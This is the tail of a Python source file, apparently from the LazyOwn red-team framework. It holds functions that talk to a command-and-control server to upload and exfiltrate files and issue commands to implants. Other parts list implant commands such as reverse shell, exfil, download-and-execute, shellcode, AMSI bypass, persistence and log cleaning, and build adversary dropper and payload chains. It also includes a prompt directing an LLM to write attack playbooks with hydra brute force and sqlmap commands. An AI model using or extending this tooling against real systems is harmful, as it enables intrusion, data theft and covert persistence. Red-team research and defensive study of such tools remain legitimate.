            print_warn(f"No next-step recommendations for '{verb}'.")
            return
        print_msg(f"Next steps after '{verb}':")
        for step in steps:
            print_msg(f"  {step.name:<22} [{step.source}] {step.reason}")

    @cmd2.with_category(command_and_control_category)

    def get_output(self):
        """Devuelve la salida acumulada"""
        return self.output

    @cmd2.with_category(lateral_movement_category)
    def upload_file_to_c2(self, file_path, clientid = None):
        """
        Sube un archivo al C2.

        Parameters:
        file_path (str): Ruta del archivo a subir.

        Returns:
        None
        """
        if not clientid:
            clientid = input (f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid

        data = {"client_id": clientid}
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(f"{self.c2_url}/download_file", auth=self.c2_auth, files=files, data=data, verify=False)
            if response.status_code == 200:
                return f"File {file_path} uploaded successfully."

            else:
                return f"Failed to upload file {file_path}. Status code: {response.status_code}"

    @cmd2.with_category(lateral_movement_category)


    def complete_upload_c2(self, text, line, begidx, endidx):
        """Autocomplete implant names from implant_config_*.json files in sessions/ directory"""

        config_dir = self.sessions_dir
        pattern = os.path.join(config_dir, "implant_config_*.json")

        implant_names = []

        config_files = glob.glob(pattern)

        for file_path in config_files:
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    name = data.get("name")
                    if name:
                        implant_names.append(name)
            except (json.JSONDecodeError, IOError):

                continue


        implant_names.sort()

        if not text:
            return implant_names

        return [name for name in implant_names if name.startswith(text)]

    @cmd2.with_category(exfiltration_category)
    def download_file_from_c2(self, file_name, clientid=""):
        """
        Descarga un archivo desde el C2.

        Parameters:
        file_name (str): Nombre del archivo a descargar.
        clientid (str): Identificador del cliente (opcional).

        Returns:
        None
        """
        if clientid == "":
            clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
        path = os.getcwd()
        sessions = f"{path}/sessions/temp_uploads"
        file_name = os.path.basename(file_name)
        output = f"{sessions}/{file_name}"
        command = f"upload:{file_name}"
        data = {"client_id": clientid, "command": command}
        response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)

        if response.status_code == 200:
            with open(output, 'wb') as f:
                f.write(response.content)
            print_msg(f"File {file_name} downloaded successfully.")
        else:
            print_error(f"Failed to download file {file_name}. Status code: {response.status_code}")

    @cmd2.with_category(post_exploitation_category)
    def issue_command_to_c2(self, command, client_id=""):
        """
        Ejecuta un comando en el cliente usando el C2.

        Parameters:
        command (str): Comando a ejecutar.
        client_id (str): ID del cliente (opcional).

        Returns:
        None
        """
        if client_id:
            clientid = client_id
        else:
            clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid

        data = {"client_id": clientid, "command": command}

        try:
            # Send the HTTPS request (ignore certificate errors with verify=False)
            response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)
            response.raise_for_status()  # Raise an exception if the status code is not 200
            print_msg(f"Command '{command}' issued successfully.")
        except ConnectionError as e:
            print_error(f"Connection error: {e}")
        except RequestException as e:
            print_error(f"Error en la solicitud: {e}")
        except Exception as e:
            print_error(f"Error inesperado: {e}")

    @cmd2.with_category(post_exploitation_category)

    def complete_issue_command_to_c2(self, text, line, begidx, endidx):
        """Autocomplete: 1st arg = implant name, 2nd arg = beacon command (with : if needed)"""
        parts = line.split()

        commands = [
            "stealth_off",
            "stealth_on",
            "download:",
            "upload:",
            "rev:",
            "exfil:",
            "download_exec:",
            "obfuscate:",
            "cleanlogs:",
            "discover:",
            "adversary:",
            "softenum:",
            "netconfig:",
            "escalatelin:",
            "proxy:",
            "stop_proxy:",
            "portscan:",
            "compressdir:",
            "sandbox:",
            "isvm:",
            "debug:",
            "persist:",
            "simulate:",
            "migrate:",
            "shellcode:",
            "amsi:",
            "terminate:"
        ]

        config_dir = self.sessions_dir
        pattern = os.path.join(config_dir, "implant_config_*.json")
        implant_names = []

        for file_path in glob.glob(pattern):
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    name = data.get("name")
                    if name:
                        implant_names.append(name)
            except (json.JSONDecodeError, IOError):
                continue

        implant_names.sort()

        parts = line[:begidx].split()
        current_word = text

        if len(parts) == 1:
            suggestions = [name for name in implant_names if name.startswith(current_word)]
            return suggestions
        elif len(parts) == 2:
            first_arg = parts[1]
            if first_arg in implant_names:
                return [cmd for cmd in commands if cmd.startswith(current_word)]
            else:
                return [name for name in implant_names if name.startswith(current_word)]
        else:
            return [cmd for cmd in commands if cmd.startswith(current_word)]


    @cmd2.with_category(reporting_category)

    def view_code(self, stdscr):
        """
        Display C and ASM code side by side in a curses-based interface.

        This function sets up a curses window to display C code and its corresponding
        assembly code side by side. It allows the user to select a .c file from the
        'sessions' directory and then displays the code with scrolling capabilities
        both vertically and horizontally. A green vertical line separates the C code
        from the ASM code.

        Parameters:
            stdscr (curses.window): The curses window object to draw on.

        Returns:
            None
        """
        curses.curs_set(0)
        stdscr.refresh()
        stdscr.clear()
        stdscr.nodelay(1)
        stdscr.timeout(100)


        path = os.path.join(os.getcwd(), 'sessions')
        c_files = [f for f in os.listdir(path) if f.endswith('.c')]

        if not c_files:
            stdscr.addstr(0, 0, "No .c files found in 'sessions/' directory.")
            stdscr.refresh()
            stdscr.getch()
            return

        stdscr.addstr(0, 0, "Available .c files:")
        for i, file in enumerate(c_files):
            stdscr.addstr(i + 1, 0, f"    {i + 1}. {file}")
        stdscr.refresh()


        selected_file = None
        while not selected_file:
            stdscr.addstr(len(c_files) + 2, 0, "Choose a file by number (1-{}): ".format(len(c_files)))
            stdscr.refresh()
            key = stdscr.getch()
            if key == 27:
                return
            try:
                choice = int(chr(key))
                if 1 <= choice <= len(c_files):
                    selected_file = c_files[choice - 1]
            except ValueError:
                stdscr.addstr(len(c_files) + 3, 0, "Invalid input. Please enter a number.")
                stdscr.refresh()
                stdscr.getch()

        code_c = os.path.join(path, selected_file)
        code_asm = code_c.replace(".c", ".asm")
        os.system(f"gcc -S -o {code_asm} {code_c}")

        with open(code_c, 'r') as f:
            c_code = f.readlines()
        with open(code_asm, 'r') as f:
            asm_code = f.readlines()


        selected_line = 0
        max_lines = max(len(c_code), len(asm_code))
        top_line = 0

        while True:
            stdscr.clear()


            for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                if i < len(c_code):
                    line = c_code[i].rstrip()
                    try:
                        if i == selected_line:
                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1], curses.A_REVERSE)
                        else:
                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1])
                    except curses.error:
                        pass


            for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                if i < len(asm_code):
                    line = asm_code[i].rstrip()
                    try:
                        if i == selected_line:
                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41], curses.A_REVERSE)
                        else:
                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41])
                    except curses.error:
                        pass

            stdscr.refresh()


            key = stdscr.getch()
            if key == curses.KEY_UP and selected_line > 0:
                selected_line -= 1
                if selected_line < top_line:
                    top_line -= 1
            elif key == curses.KEY_DOWN and selected_line < max_lines - 1:
                selected_line += 1
                if selected_line >= top_line + stdscr.getmaxyx()[0]:
                    top_line += 1
            elif key == 27:
                break

    @cmd2.with_category(post_exploitation_category)


    def get_available_actions(self):
        """Returns a list of available actions using cmd2 introspection."""
        # Usa get_all_commands() para obtener todos los comandos definidos como do_*
        return self.get_all_commands()

    @cmd2.with_category(post_exploitation_category)

    def _create_strict_yaml_prompt(self, base_prompt, nmap_services, knowledge_base):
        """
        Create a prompt that strictly enforces YAML response format without any narrative text
        """
        # Dynamic CSV context
        nmap_context = "Services detected during reconnaissance:\n"
        for service, instances in nmap_services.items():
            nmap_context += f"- {service}\n"
            for instance in instances:
                nmap_context += f"   IP: {instance['ip']}, Port: {instance['port']}, Protocol: {instance.get('protocol', 'tcp')}\n"

        # Extraer contexto adicional
        {"target": self.params.get("domain", "unknown")}

        # YAML template with very explicit formatting guidance
        yaml_template = """apt_name: ShadowBreaker
        description: Targeted attack chain for exposed services
        steps:
        - atomic_id: T1021.001
            name: Remote Services - SSH
            description: Attempt to brute force SSH credentials
            command: hydra -L users.txt -P passwords.txt ssh://192.168.1.1
            service: ssh
            mitre_info:
            mitre_id: T1021.001
            mitre_name: Remote Services - SSH
        - atomic_id: T1190
            name: Exploit Public-Facing Application
            description: Exploit vulnerability in web application
            command: sqlmap -u http://192.168.1.1/login.php --forms --batch
            service: http
            mitre_info:
            mitre_id: T1190
            mitre_name: Exploit Public-Facing Application""".replace("        ","")

        # Build the final prompt with explicit YAML instructions
        return f"""
        You are a red team planner tasked with creating ATTACK PLAYBOOKS in YAML format.

        INSTRUCTIONS:
        1. Analyze the target environment below
        2. Generate ATTACK STEPS based on the services detected
        3. Format your ENTIRE response as a YAML document
        4. DO NOT include any explanatory text, thinking, or markdown formatting
        5. ONLY OUTPUT VALID YAML

        THE OUTPUT MUST BE VALID YAML with this exact structure:
        apt_name: [attack name]
        description: [short description]
        steps:
        - atomic_id: [technique id]
            name: [technique name]
            description: [brief description]
            command: [executable command]
            service: [associated service]
            mitre_info:
            mitre_id: [MITRE ATT&CK ID]
            mitre_name: [MITRE technique name]
        - [next step...]

        TARGET ENVIRONMENT:
        {base_prompt}

        {nmap_context}

        Example of valid output format:
        {yaml_template}

        DO NOT INCLUDE ANY TEXT BEFORE OR AFTER THE YAML CONTENT.
        DO NOT INCLUDE ```yaml or ``` MARKERS.
        NEVER USE <think> TAGS.
        YOUR COMPLETE RESPONSE MUST BE VALID YAML AND NOTHING ELSE.
        """.strip().replace("        ","")

    @cmd2.with_category(reporting_category)

    def process_scan_csv(self, csv_file, ip, port, all_data, processed_ips):
        """Processes a single scan CSV file."""
        with open(csv_file, 'r', newline='') as infile:
            reader = csv.DictReader(infile, delimiter=';')
            for row in reader:
                host_entry = next((h for h in all_data['hosts'] if h['ip'] == ip), None)
                if host_entry is None:
                    host_entry = {"ip": ip, "hostnames": [row.get("FQDN", "")], "ports": []}
                    all_data['hosts'].append(host_entry)
                    processed_ips.add(ip)
                if port is not None and port not in host_entry['ports']:
                    host_entry['ports'].append(port)

                service_entry = {
                    "ip": ip,
                    "port": int(row['PORT']) if row['PORT'] else port,
                    "protocol": row['PROTOCOL'],
                    "service": row['SERVICE'],
                    "version": row['VERSION']
                }
                if service_entry not in all_data['services']:
                    all_data['services'].append(service_entry)

    def process_vuln_csv(self, csv_file, ip, all_data, processed_ips):
        """Processes a single vulnerability CSV file."""
        with open(csv_file, 'r', newline='') as infile:
            reader = csv.DictReader(infile, delimiter=';')
            for row in reader:
                service_entry = {
                    "ip": ip,
                    "port": int(row['PORT']) if row['PORT'] else None,
                    "protocol": row['PROTOCOL'],
                    "service": row['SERVICE'],
                    "version": row['VERSION']
                }

                found_service = next((s for s in all_data['services'] if
                                    s['ip'] == service_entry['ip'] and
                                    s['port'] == service_entry['port'] and
                                    s['protocol'] == service_entry['protocol'] and
                                    s['service'] == service_entry['service'] and
                                    s['version'] == service_entry['version']), None)
                if not found_service:
                    all_data['services'].append(service_entry)

                vulnerability_entry = {
                    "ip": ip,
                    "port": int(row['PORT']) if row['PORT'] else None,
                    "protocol": row['PROTOCOL'],
                    "service": row['SERVICE'],
                    "version": row['VERSION']
                }


                found_service_for_vuln = next((s for s in all_data['services'] if
                                               s['ip'] == vulnerability_entry['ip'] and
                                               s['port'] == vulnerability_entry['port'] and
                                               s['protocol'] == vulnerability_entry['protocol'] and
                                               s['service'] == vulnerability_entry['service'] and
                                               s['version'] == vulnerability_entry['version']), None)
                if found_service_for_vuln:
                    if "vulnerabilities" not in found_service_for_vuln:
                        found_service_for_vuln["vulnerabilities"] = []

                    vuln_id = f"{ip}:{row['PORT']}:{row['SERVICE']}"
                    if vuln_id not in [v['id'] for v in found_service_for_vuln["vulnerabilities"] if 'id' in v]:
                        found_service_for_vuln["vulnerabilities"].append({"id": vuln_id, "description": "Known vulnerability (inferred from filename)"})

    @cmd2.with_category(post_exploitation_category)

    def _load_adversaries(self):
        adversaries = []
        for file in glob.glob("lazyadversaries/*.yaml"):
            with open(file, 'r') as f:
                try:
                    data = yaml.safe_load(f)
                    if isinstance(data, list):
                        adversaries.extend(data)
                    elif isinstance(data, dict):
                        adversaries.append(data)
                except Exception as e:
                    print_error(f"Error loading {file}: {e}")
        return adversaries

    def _parse_adversary_args(self, line):
        args = line.split()
        if len(args) == 2:
            return args[0], args[1]
        elif len(args) == 1:
            return args[0], None
        else:
            return input("Enter ID: "), None

    def _patch_template_if_needed(self, adversary, path, replacements):
        template_path = os.path.join(path, adversary['output_path'], adversary['name'])
        if os.path.exists(template_path):
            with open(template_path, 'r') as f:
                content = f.read()
                for key, val in replacements.items():
                    content = content.replace(f"{{{key}}}", str(val))
            with open(template_path, 'w') as f:
                f.write(content)

    def _build_command_stack(self, adversary, r):
        return {
            'local': [
                replace_placeholders(adversary['copy_command'], r),
                replace_placeholders(adversary['replace_command'].replace("[shellcode]", "{shellcode}"), r),
                replace_placeholders(adversary['compile'], r),
            ],
            'remote': [
                replace_placeholders(adversary['droper'], r),
                replace_placeholders(adversary['payload'], r),
                replace_placeholders(adversary['clean_cmd'], r),
            ],
        }

    def _display_adversary_info(self, adversary, commands):
        print_msg(f"Id: {adversary['id']}")
        print_msg(f"Name: {adversary['name']}")
        print_msg(f"Technique: {adversary['technique_name']}")
        print_msg(f"Target OS: {adversary['target_os']}")
        print_msg(f"Encoded Cmd: {commands['remote'][1]}")

    def _execute_commands(self, confirm, remote_cmds):
        if confirm == 'l':
            for cmd in remote_cmds:
                self.display_toastr(cmd)
                subprocess.run(cmd + " 2>/dev/null", shell=True)
                time.sleep(1)
        elif confirm == 'r':
            for cmd in remote_cmds:
                self.issue_command_to_c2(cmd, self.c2_clientid)
                time.sleep(1)
        else:
            for cmd in remote_cmds:
                subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE).communicate(input=cmd.encode())
                print_msg(f"Command copied: {cmd}")
            print_warn("Execution cancelled.")

    @cmd2.with_category("Event Bus")
    def do_event_log(self, line: str) -> None:
        """Show recent EventBus events. Usage: event_log [N] [category]"""
        args = line.strip().split()
        n = 20
        category = None
        for a in args:
            if a.isdigit():
                n = int(a)
            else:
                category = a
        try:
            from modules.event_bus import EventCategory, get_event_bus
            bus = get_event_bus()
            if category:
                events = bus.history(n, EventCategory(category))
            else:
                events = bus.history(n)
            print_msg(f"{'='*70}")
            print_msg(f"  EventBus Log (last {len(events)})")
            print_msg(f"{'='*70}")
            for ev in events:
                ts = ev.ts if hasattr(ev, 'ts') else ''
                ts_str = time.strftime('%H:%M:%S', time.localtime(ts)) if ts else ''
                print_msg(f"  [{ts_str}] [{ev.category.value}] {ev.event_type} from {ev.source} target={ev.target}")
            print_msg(f"{'='*70}")
        except Exception as e:
            print_error(f"event_log failed: {e}")

    @cmd2.with_category("State Manager")
    def do_state_snapshot(self, line: str) -> None:
        """Show unified StateManager snapshot (DB + JSON caches)."""
        try:
            from modules.state_manager import get_state_manager
            sm = get_state_manager()
            snap = sm.session_snapshot()
            print_msg(f"{'='*60}")
            print_msg(f"  Campaign Snapshot")
            print_msg(f"{'='*60}")
            print_msg(f"  Phase:  {snap.phase}")
            print_msg(f"  Target: {snap.active_target}")
            print_msg(f"  LHOST:  {snap.lhost}")
            print_msg(f"  Domain: {snap.domain}")
            print_msg(f"  Hosts:  {snap.total_hosts} | Services: {snap.total_services} | Vulns: {snap.total_vulns} | Creds: {snap.total_creds}")
            print_msg(f"  Pending objectives: {snap.pending_objectives}")
            if snap.hosts:
                print_msg(f"  --- Hosts ---")
                for h in snap.hosts:
                    print_msg(f"    {h.address} [{h.state}] {h.hostname} ({h.os}) svc={h.services_count} creds={h.creds_count} vulns={h.vulns_count}")
            if snap.credentials:
                print_msg(f"  --- Credentials ({len(snap.credentials)}) ---")
                for c in snap.credentials[:10]:
                    print_msg(f"    {c.get('username','')}@{c.get('host','')} [{c.get('type','')}] via {c.get('origin','')}")
            if snap.vulnerabilities:
                print_msg(f"  --- Vulnerabilities ({len(snap.vulnerabilities)}) ---")
                for v in snap.vulnerabilities[:10]:
                    print_msg(f"    {v.get('name','')} [{v.get('severity','')}] on {v.get('host','')}")
            print_msg(f"{'='*60}")
        except Exception as e:
            print_error(f"state_snapshot failed: {e}")

    @cmd2.with_category("Unified Bridge")
    def do_route(self, line: str) -> None:
        """Route a natural-language prompt to a LazyOwn tool. Usage: route <prompt>"""
        if not line.strip():
            print_warn("Usage: route <natural language prompt>")
            return
        try:
            from modules.unified_bridge import UnifiedBridge
            bridge = UnifiedBridge.get()
            result = bridge.route(line.strip())
            print_msg(f"{'='*50}")
            print_msg(f"  Prompt:     {result.prompt}")
            print_msg(f"  Tool:       {result.tool}")
            print_msg(f"  Command:    {result.command}")
            print_msg(f"  Backend:    {result.backend}")
            print_msg(f"  Confidence: {result.confidence:.2f}")
            print_msg(f"  Phase:      {result.phase}")
            print_msg(f"  Error:      {result.error}")
            print_msg(f"{'='*50}")
        except Exception as e:
            print_error(f"route failed: {e}")


def main():
    _configure_logging(level=logging.INFO, console=False, file=True)
    if HEADLESS:
        from cli.headless import EXIT_CONFIG, HeadlessRunner

        p = LazyOwnShell()
        p.load_yaml_plugins()
        try:
            p.onecmd("graph")
        except Exception:
            pass

        runner = HeadlessRunner(
            p,
            json_output=startup_ns.json_output,
            profile_path=startup_ns.profile,
        )

        if startup_ns.run_chain:
            commands = [c.strip() for c in startup_ns.run_chain.split(";") if c.strip()]
            if not commands:
                print_error("Empty command chain.")
                sys.exit(EXIT_CONFIG)
            runner.run_chain(commands)
        elif startup_ns.command:
            runner.run_command(startup_ns.command)
        else:
            print_error("Headless mode requires --command or --run-chain.")
            sys.exit(EXIT_CONFIG)

        sys.exit(runner.exit_code)

    p = LazyOwnShell()
    p.load_yaml_plugins()
    try:
        p.onecmd("graph")
    except Exception as e:
        print_error(f"Error: {e}")

    old = startup_ns.old_banner
    if startup_ns.command:
        cmd = startup_ns.command
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        p.onecmd('ipp')
        p.onecmd("p")
        p.onecmd(cmd)
        p.cmdloop()
    elif startup_ns.payload:
        payload = startup_ns.payload
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        p.onecmd(f'payload {payload}')
        p.onecmd('ipp')

    if NOBANNER is False:
        if not old:
            os.system("python3 banner.py")
        print(
            f"    {RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}"
        )

    else:
        p.onecmd("rhost clean")
    p.onecmd('p')
    p.onecmd('ipp')
    p.onecmd("createcredentials")
    p.cmdloop()


if __name__ == "__main__":
    main()
